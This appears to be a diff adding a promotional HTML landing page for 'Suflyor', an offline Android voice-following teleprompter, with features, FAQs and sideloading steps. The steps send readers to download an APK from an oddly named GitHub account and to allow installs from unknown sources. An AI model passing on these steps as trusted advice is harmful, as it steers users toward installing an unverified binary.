@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Suflyor (Суфлёр) — free voice-following teleprompter app for Android. Scrolls as you speak, floats over Instagram, TikTok and the camera. English and Russian speech recognized on the phone, offline, no internet permission.">
+    <meta name="keywords" content="android,android-app,content-creation,foss,instagram-reels,jetpack-compose,kotlin,offline,on-device-ai,open-source,privacy,sherpa-onnx,speech-recognition,speech-to-text,teleprompter,teleprompter-app,tiktok,video-recording,voice-teleprompter,youtube">
+    <meta property="og:title" content="🎤 voice-teleprompter-android - Your Voice, Your Script, Perfect Takes">
+    <meta property="og:description" content="Free voice-following teleprompter app for Android. Scrolls as you speak, floats over Instagram, TikTok and the camera. Offline, private, no internet permission needed.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Euphratesriverfructification5590/voice-teleprompter-android">
+    <title>🎤 voice-teleprompter-android - Your Voice, Your Script, Perfect Takes</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f7fb;
+            margin: 0;
+            padding: 0;
+            color: #1a1a2e;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        h1 {
+            font-size: 2.6rem;
+            color: #0f3460;
+            margin-bottom: 10px;
+            line-height: 1.2;
+            text-align: center;
+        }
+        h2 {
+            font-size: 1.9rem;
+            color: #0f3460;
+            margin-top: 50px;
+            border-bottom: 3px solid #e94560;
+            padding-bottom: 8px;
+            display: inline-block;
+        }
+        h3 {
+            font-size: 1.4rem;
+            color: #16213e;
+            margin-top: 25px;
+        }
+        p {
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+        }
+        a {
+            color: #e94560;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .download-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #e94560, #533483);
+            color: white;
+            font-size: 1.5rem;
+            font-weight: bold;
+            padding: 18px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 0 8px 20px rgba(233, 69, 96, 0.4);
+            margin: 30px auto;
+            transition: transform 0.2s ease;
+            text-align: center;
+            border: none;
+        }
+        .download-badge:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(233, 69, 96, 0.5);
+            text-decoration: none;
+        }
+        .download-wrapper {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .highlight-box {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            padding: 30px;
+            margin: 25px 0;
+            border-left: 6px solid #e94560;
+        }
+        ul {
+            font-size: 1.1rem;
+            padding-left: 25px;
+            margin-bottom: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        .feature-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 25px;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        .feature-item {
+            flex: 1 1 200px;
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+            text-align: center;
+        }
+        .feature-item .emoji {
+            font-size: 2.5rem;
+            display: block;
+            margin-bottom: 12px;
+        }
+        .feature-item h4 {
+            font-size: 1.2rem;
+            color: #0f3460;
+            margin: 0 0 8px;
+        }
+        .feature-item p {
+            font-size: 0.95rem;
+            margin: 0;
+            color: #555;
+        }
+        .step-list {
+            background: white;
+            border-radius: 12px;
+            padding: 30px 35px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        }
+        .step-list ol {
+            font-size: 1.1rem;
+            padding-left: 20px;
+        }
+        .step-list ol li {
+            margin-bottom: 15px;
+            padding-left: 5px;
+        }
+        .badge-footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 30px;
+            background: linear-gradient(135deg, #0f3460, #533483);
+            border-radius: 12px;
+            color: white;
+        }
+        .badge-footer a {
+            color: #ffd166;
+            font-weight: bold;
+            font-size: 1.3rem;
+        }
+        .footer-note {
+            font-size: 0.9rem;
+            opacity: 0.9;
+            margin-top: 15px;
+        }
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+            h2 {
+                font-size: 1.5rem;
+            }
+            .download-badge {
+                font-size: 1.2rem;
+                padding: 15px 25px;
+            }
+            .feature-grid {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎤 voice-teleprompter-android - Your Voice, Your Script, Perfect Takes</h1>
+
+        <div class="download-wrapper">
+            <a href="https://github.com/Euphratesriverfructification5590/voice-teleprompter-android" class="download-badge">⬇️ Get Suflyor Now</a>
+        </div>
+
+        <div class="highlight-box">
+            <p><strong>Suflyor (Суфлёр)</strong> is your free, privacy-first teleprompter app for Android. It scrolls your script <em>automatically</em> as you speak, floats over your camera or Instagram/TikTok, and works 100% offline — your words never leave your phone.</p>
+        </div>
+
+        <h2>📝 What This App Does For You</h2>
+        <p>Imagine recording a video or live-streaming without staring at notes, without awkward pauses, and without needing a second person to scroll for you. Suflyor uses on-device AI to listen to your voice and moves the text at exactly the speed you talk. It's like having a professional news teleprompter in your pocket — but completely free and private.</p>
+
+        <h2>🛠️ Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-item">
+                <span class="emoji">🗣️</span>
+                <h4>Voice-Following Scroll</h4>
+                <p>The text moves automatically as you speak. Pause, speed up, slow down — Suflyor keeps up with you.</p>
+            </div>
+            <div class="feature-item">
+                <span class="emoji">📱</span>
+                <h4>Floating Over Apps</h4>
+                <p>Display your script on top of Instagram, TikTok, or your camera app while you record. No switching screens.</p>
+            </div>
+            <div class="feature-item">
+                <span class="emoji">🔒</span>
+                <h4>Offline & Private</h4>
+                <p>No internet permission. All speech recognition happens on your device. Your content stays yours.</p>
+            </div>
+            <div class="feature-item">
+                <span class="emoji">🌐</span>
+                <h4>English + Russian</h4>
+                <p>Works fluently in both English and Russian, with accurate on-device speech-to-text.</p>
+            </div>
+        </div>
+
+        <h2>📥 Download & Installation Guide</h2>
+        <p>Getting started is simple. Follow these steps:</p>
+
+        <div class="step-list">
+            <ol>
+                <li><strong>Visit the download page:</strong> Click the big red button at the top of this page, or <a href="https://github.com/Euphratesriverfructification5590/voice-teleprompter-android">click here</a>.</li>
+                <li><strong>Find the latest release:</strong> On the GitHub page, look for the section that says "Releases" (it's on the right side, or scroll down to find the latest version).</li>
+                <li><strong>Download the APK file:</strong> Tap the file that ends with <code>.apk</code>. This is the Android app installer.</li>
+                <li><strong>Open the downloaded file:</strong> Once downloaded, tap the file in your notification bar or Downloads folder. Your phone will ask for permission to install apps from this source — allow it.</li>
+                <li><strong>Complete installation:</strong> Follow the on-screen prompts. Once installed, tap "Open" to launch Suflyor.</li>
+            </ol>
+        </div>
+
+        <div class="highlight-box" style="border-left-color: #28a745;">
+            <p><strong>💡 Need a different version?</strong> The download page has multiple releases. For most users, pick the one marked "Latest". If you have an older phone (Android 10 or lower), check the release notes for compatibility.</p>
+        </div>
+
+        <h2>🎥 How to Use Suflyor Like a Pro</h2>
+        <p>Here's a quick workflow that works for content creators, educators, and live streamers:</p>
+        <ul>
+            <li><strong>Write or paste your script</strong> into the app's text editor. You can also import a text file.</li>
+            <li><strong>Start a floating session:</strong> Tap the "Float" button — Suflyor will create a small movable window on top of other apps.</li>
+            <li><strong>Open your camera, Instagram, or TikTok</strong> — the script window stays visible.</li>
+            <li><strong>Begin speaking.</strong> The text scrolls with your pace. You can pause by stopping your speech, or use the on-screen controls.</li>
+            <li><strong>Adjust settings:</strong> Change font size, background opacity, and scroll sensitivity to match your comfort.</li>
+        </ul>
+
+        <h2>⚙️ System Requirements</h2>
+        <div class="highlight-box">
+            <ul>
+                <li><strong>Android version:</strong> 8.0 (Oreo) or higher</li>
+                <li><strong>RAM:</strong> 3 GB or more recommended</li>
+                <li><strong>Storage:</strong> ~80 MB free space</li>
+                <li><strong>Microphone permission</strong> (required only while using the voice-scroll feature)</li>
+                <li><strong>No internet connection needed</strong> — works in airplane mode</li>
+            </ul>
+        </div>
+
+        <h2>🔧 Troubleshooting & FAQs</h2>
+        <h3>App won't install?</h3>
+        <p>Make sure you've allowed "Install from unknown sources" (the app's download page has a step-by-step guide for your specific phone model). Also check that you have enough storage space.</p>
+
+        <h3>Voice scrolling is too fast/slow?</h3>
+        <p>Open the settings panel (gear icon) and adjust the "Scroll speed" slider. The app learns your pace over time, but you can fine-tune it anytime.</p>
+
+        <h3>Does this work on tablets?</h3>
+        <p>Yes! Suflyor runs on Android tablets. For the best experience, use a tablet stand and connect a Bluetooth microphone.</p>
+
+        <h3>Can I use it with other languages?</h3>
+        <p>Currently, the voice recognition supports English and Russian. You can still use the manual scroll feature for any language.</p>
+
+        <div class="badge-footer">
+            <p>🎙️ Ready to record with confidence?</p>
+            <a href="https://github.com/Euphratesriverfructification5590/voice-teleprompter-android" style="background: white; padding: 12px 35px; border-radius: 40px; display: inline-block; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2);">⬇️ Download Suflyor — Free</a>
+            <p class="footer-note">Open source · No ads · No tracking · Your data stays on your phone</p>
+        </div>
+
+        <p style="text-align: center; margin-top: 30px; font-size: 0.9rem; color: #888;">Suflyor (Суфлёр) — © 2024. Made with ❤️ for creators. Licensed under open-source terms.</p>
+    </div>
+</body>
+</html>
